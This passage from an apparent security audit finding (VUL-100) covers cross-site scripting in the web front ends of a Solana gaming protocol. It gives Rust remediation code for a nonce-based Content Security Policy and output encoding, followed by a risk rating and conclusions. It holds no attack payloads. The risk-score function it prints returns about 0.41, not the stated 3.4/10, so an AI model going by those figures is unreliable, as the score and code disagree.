    notificationDiv.appendChild(titleElement);

    notificationDiv.appendChild(document.createTextNode(': '));

    const messageElement = document.createElement('span');
    messageElement.textContent = message;
    notificationDiv.appendChild(messageElement);

    const notificationContainer = document.getElementById('notifications');
    if (notificationContainer) {
        notificationContainer.appendChild(notificationDiv);

        // Auto-remove after 5 seconds
        setTimeout(() => {
            if (notificationDiv.parentNode) {
                notificationDiv.parentNode.removeChild(notificationDiv);
            }
        }, 5000);
    }
}
```

### Long-term Solutions

**1. Content Security Policy Implementation**
```rust
// SECURE: Comprehensive CSP implementation
pub struct CSPManager {
    nonces: std::collections::HashMap<String, String>,
}

impl CSPManager {
    pub fn new() -> Self {
        Self {
            nonces: std::collections::HashMap::new(),
        }
    }

    pub fn generate_csp_header(&mut self, page_type: &str) -> String {
        let script_nonce = self.generate_nonce();
        self.nonces.insert(page_type.to_string(), script_nonce.clone());

        format!(
            "default-src 'self'; \
             script-src 'self' 'nonce-{}'; \
             style-src 'self' 'unsafe-inline'; \
             img-src 'self' data: https:; \
             font-src 'self'; \
             connect-src 'self'; \
             frame-src 'none'; \
             object-src 'none'; \
             base-uri 'self'; \
             form-action 'self'; \
             upgrade-insecure-requests",
            script_nonce
        )
    }

    pub fn get_nonce(&self, page_type: &str) -> Option<&String> {
        self.nonces.get(page_type)
    }

    fn generate_nonce(&self) -> String {
        use rand::{RngCore, SeedableRng};
        use rand_chacha::ChaCha20Rng;

        let mut rng = ChaCha20Rng::from_entropy();
        let mut nonce_bytes = [0u8; 16];
        rng.fill_bytes(&mut nonce_bytes);
        base64::encode(&nonce_bytes)
    }
}

// SECURE: Template engine with XSS protection
pub struct SecureTemplateEngine {
    sanitizer: InputSanitizer,
    csp_manager: CSPManager,
}

impl SecureTemplateEngine {
    pub fn new() -> Self {
        Self {
            sanitizer: InputSanitizer::new(),
            csp_manager: CSPManager::new(),
        }
    }

    pub fn render_player_profile(&mut self, profile: &PlayerProfile) -> Result<(String, String), TemplateError> {
        // Sanitize all user inputs
        let safe_display_name = self.sanitizer.sanitize_user_input(&profile.display_name, "display_name")?;
        let safe_bio = self.sanitizer.sanitize_user_input(&profile.bio, "bio")?;

        let safe_achievements: Result<Vec<String>, _> = profile.achievements.iter()
            .map(|achievement| self.sanitizer.sanitize_user_input(achievement, "achievement"))
            .collect();

        let safe_achievements = safe_achievements?;

        // Generate CSP header
        let csp_header = self.csp_manager.generate_csp_header("player_profile");
        let nonce = self.csp_manager.get_nonce("player_profile").unwrap();

        let html = format!(
            r#"
            <!DOCTYPE html>
            <html>
            <head>
                <title>Player Profile</title>
                <meta http-equiv="Content-Security-Policy" content="{}">
            </head>
            <body>
                <h1>Player: {}</h1>
                <div class="bio">
                    <h2>Bio:</h2>
                    <p>{}</p>
                </div>
                <div class="achievements">
                    <h2>Achievements:</h2>
                    <ul>
                        {}
                    </ul>
                </div>
                <script src="/js/player-profile.js" nonce="{}"></script>
            </body>
            </html>
            "#,
            csp_header,
            encode_text(&safe_display_name),
            encode_text(&safe_bio),
            safe_achievements.iter()
                .map(|achievement| format!("<li>{}</li>", encode_text(achievement)))
                .collect::<Vec<_>>()
                .join(""),
            nonce
        );

        Ok((html, csp_header))
    }
}

#[derive(Debug)]
pub enum TemplateError {
    SanitizationError(SanitizationError),
    InvalidTemplate(String),
}

impl From<SanitizationError> for TemplateError {
    fn from(error: SanitizationError) -> Self {
        Self::SanitizationError(error)
    }
}
```

## Risk Assessment

### Risk Factors Analysis

**Likelihood: Low-Medium (4/10)**
- Requires vulnerable web interface implementation
- Depends on user-generated content features
- Limited to specific frontend components
- Attack success varies by browser security

**Impact: Low (3/10)**
- Limited to client-side effects
- No direct access to smart contract funds
- Primarily affects individual user sessions
- Minimal data exposure in most cases

**Exploitability: Medium (5/10)**
- Well-understood attack vectors
- Many automated tools available
- Requires user interaction for execution
- Browser security features provide some protection

**Detection Difficulty: Low-Medium (4/10)**
- Modern browsers log XSS attempts
- WAF solutions can detect common patterns
- User reports may indicate successful attacks
- CSP violations are logged

### Overall Risk Rating

**Composite Risk Score: 3.4/10 (Low)**

```rust
pub fn calculate_xss_risk() -> f64 {
    let likelihood = 4.0;
    let impact = 3.0;
    let exploitability = 5.0;
    let detection_difficulty = 4.0;

    // Weighted calculation emphasizing impact and detection
    (likelihood * 0.25 + impact * 0.40 + exploitability * 0.20 + (10.0 - detection_difficulty) * 0.15) / 10.0
}
```

### Context-Specific Risk Assessment

```rust
pub enum WebComponentContext {
    PlayerProfile,
    GameChat,
    PublicLeaderboard,
    AdminDashboard,
}

impl WebComponentContext {
    pub fn assess_xss_risk(&self) -> (f64, String) {
        match self {
            Self::PlayerProfile => (3.0, "Low risk - limited user exposure".to_string()),
            Self::GameChat => (4.5, "Medium risk - real-time user interaction".to_string()),
            Self::PublicLeaderboard => (3.5, "Medium-low risk - high visibility".to_string()),
            Self::AdminDashboard => (6.0, "Medium-high risk - administrative access".to_string()),
        }
    }
}
```

## Conclusion

VUL-100 identifies potential cross-site scripting vulnerabilities in web interfaces supporting the Solana gaming protocol. While the core blockchain components are not directly affected, the supporting web infrastructure requires proper XSS prevention measures.

**Key Findings:**
- Insufficient HTML escaping in user-generated content display
- Missing Content Security Policy implementation
- Unsafe DOM manipulation in JavaScript components
- Inadequate input validation for web interface inputs

**Impact Assessment:**
The vulnerability primarily affects user experience and client-side security rather than core protocol security or financial systems. The risk is contained to individual user sessions and does not compromise smart contract integrity.

**Remediation Priority:**
As a low-severity issue, this should be addressed during regular security hardening. Implementation of proper XSS prevention measures provides important defense-in-depth benefits.

**Best Practices Implementation:**
1. Comprehensive HTML escaping for all user content
2. Content Security Policy with strict directives
3. Input validation and sanitization frameworks
4. Secure DOM manipulation practices

The low severity reflects the limited scope and impact on the core gaming protocol, but addressing XSS vulnerabilities is essential for maintaining user trust and preventing potential exploitation of web-based components.

---

*Security Note: While XSS vulnerabilities may seem limited in impact for blockchain applications, they can serve as entry points for more sophisticated attacks including social engineering and credential theft. Comprehensive prevention is recommended as a security best practice.*